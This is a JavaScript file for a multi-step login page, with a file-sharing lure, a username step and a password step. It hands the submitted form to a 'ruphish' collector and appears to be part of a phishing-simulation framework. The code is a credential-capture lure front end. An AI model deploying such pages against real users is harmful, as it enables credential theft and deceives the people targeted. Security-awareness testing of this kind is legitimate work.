// Shared by the six interactive catalog pages and embedded into each resource copy.
// Intermediate actions never record observations. The collector owns final delivery.
(() => {
  const root = document.querySelector('[data-login-flow]');
  const form = root.querySelector('form');
  const username = form.elements.namedItem('username');
  const password = form.elements.namedItem('password');
  const identifier = root.querySelector('[data-identifier]');
  const credential = root.querySelector('[data-credential]');
  const sharing = root.querySelector('[data-sharing]');
  const login = root.querySelector('[data-login]');
  const account = root.querySelector('[data-account]');
  const reveal = root.querySelector('[data-reveal]');
  const finalButton = root.querySelector('[data-final]');
  const nextButton = root.querySelector('[data-next]');
  const failure = root.querySelector('[data-failure]');
  const combined = root.dataset.loginFlow === 'combined';
  let stage = sharing ? 'sharing' : 'identifier';
  let pending = false;
  let submitted = false;

  function display(focus = true) {
    const passwordStep = stage === 'password';
    const active = stage !== 'sharing';
    if (sharing) {
      sharing.hidden = active;
    }
    login.hidden = !active;
    identifier.hidden = passwordStep && !combined;
    identifier.disabled = !active || (passwordStep && !combined);
    credential.hidden = !passwordStep;
    credential.disabled = !passwordStep;
    // Enter must target the active submit button, not the disabled earlier step.
    if (nextButton) {
      nextButton.type = passwordStep ? 'button' : 'submit';
    }
    account.hidden = !passwordStep || combined;
    account.textContent = username.value;
    root.querySelector('[data-identifier-copy]').hidden = passwordStep && !combined;
    username.readOnly = pending || submitted;
    password.readOnly = pending || submitted;
    root.querySelector('[data-title]').textContent = passwordStep
      ? root.dataset.passwordTitle
      : root.dataset.identifierTitle;
    root.querySelectorAll('[data-back]').forEach((button) => {
      button.disabled = pending || submitted;
    });
    finalButton.disabled = pending || submitted;
    if (focus) {
      (active
        ? passwordStep && !combined
          ? password
          : username
        : root.querySelector('[data-open]')
      ).focus();
    }
  }

  function resetPassword() {
    password.value = '';
    password.type = 'password';
    reveal.checked = false;
    submitted = false;
    failure.hidden = true;
  }

  root.querySelector('[data-open]')?.addEventListener('click', () => {
    stage = combined ? 'password' : 'identifier';
    display();
  });
  root.querySelectorAll('[data-back]').forEach((button) => {
    button.addEventListener('click', () => {
      if (pending) {
        return;
      }
      resetPassword();
      stage = button.hasAttribute('data-back-file') ? 'sharing' : 'identifier';
      display();
    });
  });
  reveal.addEventListener('change', () => {
    password.type = reveal.checked ? 'text' : 'password';
  });
  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    if (pending || submitted || stage === 'sharing' || !form.reportValidity()) {
      return;
    }
    if (stage === 'identifier') {
      stage = 'password';
      display();
      return;
    }
    if (typeof window.ruphish?.submit !== 'function') {
      failure.hidden = false;
      return;
    }
    pending = true;
    submitted = true;
    // Keep eligible fields enabled until the collector has sampled presence.
    display(false);
    try {
      await window.ruphish.submit(form);
      // The collector supplies preview/confirmation/uncertain-delivery feedback and
      // a retry button that keeps the same event identity. Do not create a new event.
    } catch {
      submitted = false;
      failure.hidden = false;
    } finally {
      pending = false;
      display(false);
    }
  });
  display(false);
})();
